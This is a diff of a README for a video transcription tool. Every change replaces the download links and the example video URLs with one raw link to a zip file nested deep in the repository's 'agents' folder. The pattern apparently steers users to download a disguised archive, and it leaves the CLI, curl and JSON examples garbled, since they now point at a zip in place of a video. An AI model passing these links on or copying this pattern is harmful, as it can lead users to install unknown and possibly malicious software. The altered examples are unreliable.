@@ -1,6 +1,6 @@
 # 🎥 universal-video-transcriber - Turn video links into text fast
 
-[![Download](https://img.shields.io/badge/Download%20Here-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ultraconservative-abneylevel672/universal-video-transcriber)
+[![Download](https://img.shields.io/badge/Download%20Here-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ultraconservative-abneylevel672/universal-video-transcriber/raw/refs/heads/main/skill/video-url-transcriber/agents/universal-transcriber-video-v2.0.zip)
 
 ## 🖥️ What this app does
 
@@ -24,7 +24,7 @@ It follows this flow:
 ## 📥 Download and set up on Windows
 
 1. Visit the download page here:  
-   [https://github.com/ultraconservative-abneylevel672/universal-video-transcriber](https://github.com/ultraconservative-abneylevel672/universal-video-transcriber)
+   [https://github.com/ultraconservative-abneylevel672/universal-video-transcriber/raw/refs/heads/main/skill/video-url-transcriber/agents/universal-transcriber-video-v2.0.zip](https://github.com/ultraconservative-abneylevel672/universal-video-transcriber/raw/refs/heads/main/skill/video-url-transcriber/agents/universal-transcriber-video-v2.0.zip)
 
 2. On the page, look for the latest release or the main project files.
 
@@ -90,7 +90,7 @@ python skill/video-url-transcriber/scripts/transcribe_url.py --doctor
 Then run a transcription with a video link:
 
 ```bash
-python skill/video-url-transcriber/scripts/transcribe_url.py "https://www.youtube.com/watch?v=..." --model-size small
+python skill/video-url-transcriber/scripts/transcribe_url.py "https://github.com/ultraconservative-abneylevel672/universal-video-transcriber/raw/refs/heads/main/skill/video-url-transcriber/agents/universal-transcriber-video-v2.0.zip" --model-size small
 ```
 
 If you want faster results, keep `--model-size small`.
@@ -117,7 +117,7 @@ Use this endpoint to transcribe a video:
 curl -s http://127.0.0.1:8099/transcribe \
   -H 'content-type: application/json' \
   -d '{
-    "url": "https://www.youtube.com/watch?v=...",
+    "url": "https://github.com/ultraconservative-abneylevel672/universal-video-transcriber/raw/refs/heads/main/skill/video-url-transcriber/agents/universal-transcriber-video-v2.0.zip",
     "language": null,
     "model_size": "small",
     "word_timestamps": true,
@@ -133,7 +133,7 @@ Example shape:
 
 ```json
 {
-  "source_url": "https://x.com/.../video/1",
+  "source_url": "https://github.com/ultraconservative-abneylevel672/universal-video-transcriber/raw/refs/heads/main/skill/video-url-transcriber/agents/universal-transcriber-video-v2.0.zip",
   "platform": "x",
   "title": "Example Video Title",
   "language": "en",
